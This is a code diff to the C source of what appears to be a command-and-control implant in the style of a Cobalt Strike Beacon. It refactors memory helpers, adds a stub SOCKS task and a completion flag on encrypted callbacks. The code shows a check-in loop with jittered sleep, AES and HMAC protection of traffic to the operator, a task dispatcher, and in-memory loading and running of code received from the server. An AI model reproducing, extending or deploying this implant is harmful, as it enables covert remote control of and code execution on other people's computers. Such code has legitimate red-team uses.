@@ -15,7 +15,7 @@ DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenRandom              ( BCRYPT_AL
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptOpenAlgorithmProvider  ( BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG );
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptImportKeyPair          ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, ULONG );
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptGenerateSymmetricKey   ( BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG );
-DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptSetProperty             ( BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG );
+DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptSetProperty            ( BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG );
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptEncrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptDecrypt                ( BCRYPT_KEY_HANDLE, PUCHAR, ULONG, void *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG *, ULONG );
 DECLSPEC_IMPORT NTSTATUS WINAPI  BCRYPT$BCryptCloseAlgorithmProvider ( BCRYPT_ALG_HANDLE, ULONG );
@@ -91,9 +91,9 @@ void setup_config ( char * pack, int pack_len )
 
 void go ( char * loader )
 {
-    KERNEL32$VirtualFree ( loader, 0, MEM_RELEASE );
-    generate_metadata    ( );
-    udc2_init            ( );
+    free_memory ( loader );
+    generate_metadata ( );
+    udc2_init         ( );
 
     while ( g_running )
     {
@@ -124,10 +124,10 @@ void go ( char * loader )
 
             if ( max_delta > 0 )
             {
-                UINT rand_val  = random_uint ( );
-                LONG delta     = ( LONG ) ( rand_val % ( max_delta * 2 + 1 ) ) - ( LONG ) max_delta;
-                LONG result    = ( LONG ) sleep_ms + delta;
-                sleep_ms       = result > 0 ? ( DWORD ) result : 0;
+                UINT rand_val = random_uint ( );
+                LONG delta    = ( LONG ) ( rand_val % ( max_delta * 2 + 1 ) ) - ( LONG ) max_delta;
+                LONG result   = ( LONG ) sleep_ms + delta;
+                sleep_ms      = result > 0 ? ( DWORD ) result : 0;
             }
         }
 
@@ -147,7 +147,7 @@ void go ( char * loader )
 void format_checkin ( formatp * parser )
 {
     size_t total_len = sizeof ( int )     /* callback type */
-                     + sizeof (UINT )     /* dummy task id */
+                     + sizeof ( UINT )    /* dummy task id */
                      + sizeof ( int )     /* metadata length */
                      + g_metadata.length; /* metadata */
 
@@ -297,8 +297,8 @@ BOOL aes_encrypt ( UCHAR * plaintext, ULONG plaintext_len, UCHAR * key, UCHAR * 
 {
     BCRYPT_ALG_HANDLE alg  = NULL;
     BCRYPT_KEY_HANDLE hkey = NULL;
+    BOOL     result        = FALSE;
     NTSTATUS status;
-    BOOL result            = FALSE;
 
     /*
      * BCryptEncrypt updates the IV buffer in-place (CBC chaining).
@@ -309,24 +309,30 @@ BOOL aes_encrypt ( UCHAR * plaintext, ULONG plaintext_len, UCHAR * key, UCHAR * 
     memcpy ( iv_copy, iv, AES_KEY_LEN );
 
     status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptSetProperty ( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptGenerateSymmetricKey ( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     /* query output size (includes PKCS7 padding to next block boundary) */
     status = BCRYPT$BCryptEncrypt ( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, NULL, 0, ciphertext_len, BCRYPT_BLOCK_PADDING );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     memcpy ( iv_copy, iv, AES_KEY_LEN ); /* restore for the actual encrypt call */
+
     status = BCRYPT$BCryptEncrypt ( hkey, plaintext, plaintext_len, NULL, iv_copy, AES_KEY_LEN, ciphertext, *ciphertext_len, ciphertext_len, BCRYPT_BLOCK_PADDING );
+
     if ( NT_SUCCESS ( status ) )
         result = TRUE;
 
@@ -348,18 +354,22 @@ BOOL aes_decrypt ( UCHAR * ciphertext, ULONG ciphertext_len, UCHAR * key, UCHAR 
     memcpy ( iv_copy, iv, AES_KEY_LEN );
 
     status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_AES_ALGORITHM, NULL, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptSetProperty ( alg, BCRYPT_CHAINING_MODE, ( PUCHAR ) BCRYPT_CHAIN_MODE_CBC, sizeof ( BCRYPT_CHAIN_MODE_CBC ), 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptGenerateSymmetricKey ( alg, &hkey, NULL, 0, key, AES_KEY_LEN, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptDecrypt ( hkey, ciphertext, ciphertext_len, NULL, iv_copy, AES_KEY_LEN, plaintext, *plaintext_len, plaintext_len, BCRYPT_BLOCK_PADDING );
+
     if ( NT_SUCCESS ( status ) )
         result = TRUE;
 
@@ -374,22 +384,26 @@ BOOL compute_hmac ( UCHAR * data, ULONG data_len, UCHAR * key, ULONG key_len, UC
 {
     BCRYPT_ALG_HANDLE  alg  = NULL;
     BCRYPT_HASH_HANDLE hash = NULL;
-    NTSTATUS           status;
-    BOOL               result = FALSE;
+    BOOL     result         = FALSE;
+    NTSTATUS status;
 
     status = BCRYPT$BCryptOpenAlgorithmProvider ( &alg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptCreateHash ( alg, &hash, NULL, 0, key, key_len, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptHashData ( hash, data, data_len, 0 );
+
     if ( ! NT_SUCCESS ( status ) )
         goto cleanup;
 
     status = BCRYPT$BCryptFinishHash ( hash, hmac, HMAC_LEN, 0 );
+
     if ( NT_SUCCESS ( status ) )
         result = TRUE;
 
@@ -462,7 +476,7 @@ void get_internal_ip ( UCHAR * buffer )
     KERNEL32$HeapFree ( heap, 0, adapters );
 }
 
-void process_messages ( char * data, size_t len )
+__attribute__ ( ( optimize ( "O0" ) ) ) void process_messages ( char * data, size_t len )
 {
     datap msg_parser;
     BeaconDataParse ( &msg_parser, data, len );
@@ -538,7 +552,11 @@ void process_messages ( char * data, size_t len )
         case TASK_PICO:
             execute_pico ( task_data, task_data_len );
             break;
-        
+
+        case TASK_SOCKS:
+            execute_socks ( task_data, task_data_len );
+            break;
+
         default:
             break;
         }
@@ -565,8 +583,8 @@ void execute_pico ( char * data, int len )
     pico_src = BeaconDataExtract ( &parser, &pico_len );
     args     = BeaconDataExtract ( &parser, &args_len );
 
-    pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
-    pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE );
+    pico_code = allocate_memory ( PicoCodeSize ( pico_src ), PAGE_READWRITE );
+    pico_data = allocate_memory ( PicoDataSize ( pico_src ), PAGE_READWRITE );
 
     funcs.LoadLibraryA         = LoadLibraryA;
     funcs.GetProcAddress       = GetProcAddress;
@@ -590,8 +608,23 @@ void execute_pico ( char * data, int len )
 
     ( ( PICO_GO ) ( PicoEntryPoint ( pico_src, pico_code ) ) ) ( args, args_len );
 
-    KERNEL32$VirtualFree ( pico_code, 0, MEM_RELEASE );
-    KERNEL32$VirtualFree ( pico_data, 0, MEM_RELEASE );
+    free_memory ( pico_code );
+    free_memory ( pico_data );
+}
+
+void __attribute__ ( ( noinline ) ) execute_socks ( char * data, int len )
+{
+    __asm__ __volatile__( "" );
+}
+
+LPVOID allocate_memory ( size_t size, DWORD protection )
+{
+    return KERNEL32$VirtualAlloc ( NULL, size, MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, protection );
+}
+
+void free_memory ( LPVOID address )
+{
+    KERNEL32$VirtualFree ( address, 0, MEM_RELEASE );
 }
 
 void set_sleep ( char * data, int len )
@@ -602,8 +635,7 @@ void set_sleep ( char * data, int len )
     int sleep  = BeaconDataInt ( &parser );
     int jitter = BeaconDataInt ( &parser );
 
-    if ( jitter > 100 )
-        jitter = 100;
+    if ( jitter > 100 ) jitter = 100;
     
     g_config.sleep  = sleep;
     g_config.jitter = jitter;
@@ -766,8 +798,17 @@ void BeaconPrintf ( int type, char * fmt, ... )
     MSVCRT$free  ( buffer );
 }
 
-void BeaconOutput ( int type, char * data, int data_len )
+void beacon_output_ex ( int type, char * data, int data_len, int complete )
 {
+    /* BCryptEncrypt rejects NULL input — use a dummy byte for empty payloads */
+    char empty = 0;
+    
+    if ( ! data || data_len < 0 )
+    {
+        data     = &empty;
+        data_len = 0;
+    }
+
     /* generate random IV and encrypt the data */
     UCHAR iv [ AES_KEY_LEN ];
     random_bytes ( iv, AES_KEY_LEN );
@@ -804,12 +845,12 @@ void BeaconOutput ( int type, char * data, int data_len )
     /* enc_data = hmac | iv | ciphertext */
     ULONG enc_data_len = HMAC_LEN + AES_KEY_LEN + ct_len;
 
-    /* wire format: type | task_id | enc_data_len | enc_data | flag */
+    /* wire format: type | task_id | enc_data_len | enc_data | complete */
     size_t total_len = sizeof ( int  )   /* type         */
                      + sizeof ( UINT )   /* task_id      */
                      + sizeof ( int  )   /* enc_data_len */
                      + enc_data_len      /* enc_data     */
-                     + sizeof ( int  );  /* flag         */
+                     + sizeof ( int  );  /* complete     */
 
     formatp output;
     BeaconFormatAlloc  ( &output, total_len );
@@ -819,7 +860,7 @@ void BeaconOutput ( int type, char * data, int data_len )
     BeaconFormatAppend ( &output, ( char * ) hmac, HMAC_LEN );
     BeaconFormatAppend ( &output, ( char * ) iv, AES_KEY_LEN );
     BeaconFormatAppend ( &output, ( char * ) ct, ct_len );
-    BeaconFormatInt    ( &output, 1 ); /* temp */
+    BeaconFormatInt    ( &output, complete );
 
     char * resp_body;
     size_t resp_size;
@@ -831,6 +872,11 @@ void BeaconOutput ( int type, char * data, int data_len )
 
 cleanup_ct:
     MSVCRT$free ( ct );
+}
+
+void BeaconOutput ( int type, char * data, int data_len )
+{
+    beacon_output_ex ( type, data, data_len, 1 );
 }
 
 /**
